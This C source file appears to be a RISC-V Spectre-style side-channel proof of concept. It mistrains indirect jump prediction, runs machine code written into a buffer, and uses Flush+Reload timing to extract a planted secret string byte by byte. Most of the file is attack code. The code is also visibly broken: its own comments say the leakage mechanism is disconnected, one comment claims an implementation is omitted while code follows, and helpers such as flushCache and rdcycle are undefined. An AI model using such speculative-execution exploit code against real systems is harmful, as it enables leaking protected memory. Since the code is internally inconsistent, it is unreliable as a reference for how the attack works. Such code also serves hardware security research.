#include <stdio.h>
#include <stdint.h>

#define NUM_TRAINING 6          // Training iterations, related to branch predictor state
#define NUM_ROUNDS 1            // Outer rounds (not used in inner loop logic)
#define SAME_INDEX_ROUNDS 10    // Repetitions for attacking the same secret index for reliability
#define SECRET_LENGTH 26        // Length of the secret string
#define CACHE_THRESHOLD 50      // Cache hit time threshold in cycles

#define CODE_SIZE 32            // Size of the buffer for dynamic code execution
// Buffer to hold dynamically written machine code, aligned to 4 bytes
static uint8_t codeSection[CODE_SIZE] __attribute__((aligned(4)));

/*
 * Generic function pointer type returning int, taking void arguments.
 */
typedef int (*functype_t)(void);

// Machine code snippet (RISC-V): Likely returns 42 (0x2A)
// 0x40a50533 -> xor a0, a0, a0  (a0 = 0)
// 0x02a50513 -> addi a0, a0, 42 (a0 = 42)
// 0x00008067 -> ret             (return, jump to address in ra)
static const uint8_t code_ret42[12] = {
    0x33, 0x05, 0xa5, 0x40,  // xor a0, a0, a0
    0x13, 0x05, 0xa0, 0x02,  // addi a0, a0, 42 (0x2A)
    0x67, 0x80, 0x00, 0x00   // ret
};

// Machine code snippet (RISC-V): Likely returns 99 (0x63)
// 0x40a50533 -> xor a0, a0, a0  (a0 = 0)
// 0x06350513 -> addi a0, a0, 99 (a0 = 99)
// 0x00008067 -> ret             (return)
static const uint8_t code_ret99[12] = {
    0x33, 0x05, 0xa5, 0x40,  // xor a0, a0, a0
    0x13, 0x05, 0x35, 0x06,  // addi a0, a0, 99 (0x63)
    0x67, 0x80, 0x00, 0x00   // ret
};


/**
 * @brief Calls the machine code currently present in codeSection.
 * @return Integer value returned by the executed code (in register a0).
 */
static int call_code(void) {
    // Cast the code buffer address to a function pointer
    functype_t fn = (functype_t) codeSection;
    // Before calling, ensure instruction cache coherency if necessary!
    // On some systems, might need: asm volatile ("fence.i" ::: "memory");
    return fn(); // Execute the code in the buffer
}

// Data arrays for the side-channel attack
uint64_t array1_size = 16;
uint8_t padding1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t padding2[64];
// Probe array for Flush+Reload
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
char* secretData = "!\"#ThisIsTheSecretString:)";

/**
 * @brief Finds the indices and values of the top two largest elements in an array.
 * (Identical to previous example)
 */
void findTopTwo(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray) {
    // Implementation omitted for brevity - assume identical to previous example
    outValArray[0] = 0; outValArray[1] = 0; outIdxArray[0] = 0; outIdxArray[1] = 0;
    for (uint64_t i = 0; i < inArraySize; ++i) {
        if (inArray[i] > outValArray[0]) {
            outValArray[1] = outValArray[0]; outIdxArray[1] = outIdxArray[0];
            outValArray[0] = inArray[i]; outIdxArray[0] = i;
        } else if (inArray[i] > outValArray[1]) {
            outValArray[1] = inArray[i]; outIdxArray[1] = i;
        }
    }
}

/**
 * @brief Victim function called during the 'attack' phase of training.
 * Writes machine code (code_ret99) into codeSection and executes it.
 * Note: This version doesn't directly access array2 or use the 'idx' parameter.
 * The side channel leakage mechanism seems different or incomplete here compared to typical examples.
 * @param idx Index (unused in this function version).
 */
void victimFunction(uint64_t idx) {
    int val = 0;
    // Copy code that returns 99 into the executable buffer
    for (int i = 0; i < 12; i++) {
        codeSection[i] = code_ret99[i];
    }
    // Fill the rest with NOPs (or padding, 0x00 might not be a valid NOP)
    // A true NOP is 0x00000013 (addi zero, zero, 0)
    for (int i = 12; i < CODE_SIZE; i++) {
        codeSection[i] = 0x13; // Using NOP instruction encoding
        // codeSection[i] = 0x00; // Original code used 0x00
    }

    // Explicit fence.i might be needed here to ensure instruction cache sees the write
    asm volatile ("fence.i" ::: "memory");
    val = call_code(); // Execute the copied code
    printf("Victim func called, executed code returned: %d (expected 99)\n", val);
    (void)idx; // Suppress unused parameter warning
}

/**
 * @brief Placeholder function called during the 'training' phase.
 * Writes machine code (code_ret42) into codeSection and executes it.
 */
void placeholderFunction() {
    printf("Placeholder func called.\n");
    int val = 0;
    // Copy code that returns 42 into the executable buffer
    for (int i = 0; i < 12; i++) {
        codeSection[i] = code_ret42[i];
    }
    // Fill the rest with NOPs
    for (int i = 12; i < CODE_SIZE; i++) {
        codeSection[i] = 0x13; // Using NOP instruction encoding
    }

    // Explicit fence.i might be needed here
    asm volatile ("fence.i" ::: "memory");
    val = call_code(); // Execute the copied code
    printf("Placeholder executed code returned: %d (expected 42)\n", val);
}

int main(void) {
    uint64_t placeholderAddr = (uint64_t)(&placeholderFunction);
    uint64_t victimAddr = (uint64_t)(&victimFunction);
    uint64_t startTime, elapsedTime, passInAddr;
    // Calculate offset for secret access within array1 bounds
    uint64_t attackIndex = (uint64_t)(secretData - (char*)array1);
    uint64_t passInIndex, randomIndex; // Index argument for JALR target
    uint8_t dummy = 0;
    static uint64_t results[256]; // Cache hit results array

    printf("Starting the loop...\n");

    // Loop through each byte of the secret
    for(uint64_t i = 0; i < SECRET_LENGTH; ++i) {

        // Reset results for the current byte
        for(uint64_t j = 0; j < 256; ++j) {
            results[j] = 0;
        }

        printf("Executing attack for secret byte %lu...\n", i);

        // Repeat training/attack sequence for reliability
        for(uint64_t round = 0; round < SAME_INDEX_ROUNDS; ++round) {

            // Flush probe array
            flushCache((uint64_t)array2, sizeof(array2));

            // Training / Attack loop (Spectre-style conditional target selection)
            for(int64_t k = ((NUM_TRAINING + 1) * NUM_ROUNDS) - 1; k >= 0; --k) {
                // Conditionally select target address for JALR: victimAddr or placeholderAddr
                passInAddr = ((k % (NUM_TRAINING + 1)) - 1) & ~0xFFFF;
                passInAddr = (passInAddr | (passInAddr >> 16));
                passInAddr = victimAddr ^ (passInAddr & (placeholderAddr ^ victimAddr));

                // Conditionally select index argument for target function: attackIndex or randomIndex
                randomIndex = round % array1_size;
                passInIndex = ((k % (NUM_TRAINING + 1)) - 1) & ~0xFFFF;
                passInIndex = (passInIndex | (passInIndex >> 16));
                passInIndex = randomIndex ^ (passInIndex & (attackIndex ^ randomIndex));

                // Loop to potentially manipulate BHR state
                for(uint64_t l = 0; l < 30; ++l) {
                    asm("");
                }

                flushCache((uint64_t)array2, sizeof(array2));

                // Execute JALR after delay, targeting selected address, passing selected index
                // The target function (victim/placeholder) now writes shellcode and executes it.
                // The `passInIndex` is passed in a0 but seems unused by victim/placeholder now.
                asm volatile(
                    "addi %[addr], %[addr], -2\n" // Delay start
                    "addi t1, zero, 2\n"
                    "slli t2, t1, 0x4\n"
                    "fcvt.s.lu fa4, t1\n"
                    "fcvt.s.lu fa5, t2\n"
                    "fdiv.s fa5, fa5, fa4\n"
                    "fdiv.s fa5, fa5, fa4\n"
                    "fdiv.s fa5, fa5, fa4\n"
                    "fdiv.s fa5, fa5, fa4\n"
                    "fcvt.lu.s t2, fa5, rtz\n"
                    "add %[addr], %[addr], t2\n" // Delay end
                    "mv a0, %[arg]\n"           // Move index argument into a0 (passed to target)
                    "jalr ra, %[addr], 0\n"     // Jump to target
                    : /* no output */
                    : [addr] "r" (passInAddr), [arg] "r" (passInIndex)
                    : "a0", "t1", "t2", "fa4", "fa5", "memory"); // Clobbers
            } // End training/attack k loop

            // Probe phase: Measure access time to array2 elements
            // **Critical Note:** It's unclear how the execution of victim/placeholder
            // (which write/call shellcode returning 42 or 99) affects the cache state of array2
            // in this version. The side-channel mechanism seems disconnected here.
            // Assuming the actual leakage mechanism is intended to be elsewhere or within the shellcode (not shown).
            for (uint64_t m = 0; m < 256; ++m) {
                uint8_t* current_addr = &array2[m * L1_BLOCK_SZ_BYTES];
                startTime = rdcycle();
                dummy &= *current_addr; // Access element
                elapsedTime = (rdcycle() - startTime);

                if (elapsedTime < CACHE_THRESHOLD) {
                    results[m] += 1; // Record cache hit
                }
            }
        } // End rounds loop

        // Find top two results (although the source of hits is unclear)
        uint8_t bestGuesses[2];
        uint64_t bestHits[2];
        findTopTwo(results, 256, bestGuesses, bestHits);

        printf("Result for index %lu: Top Guesses (Hits, Dec, Char): 1.(%llu, %d, %c) 2.(%llu, %d, %c). Expected '%c'\n",
               i,
               (unsigned long long)bestHits[0], bestGuesses[0], (bestGuesses[0] ? bestGuesses[0] : '?'),
               (unsigned long long)bestHits[1], bestGuesses[1], (bestGuesses[1] ? bestGuesses[1] : '?'),
               secretData[i]);


        // Increment index offset for the next secret byte
        ++attackIndex;
    } // End main secret loop (i)

    printf("\nExtraction loop finished.\n");
    return 0;
}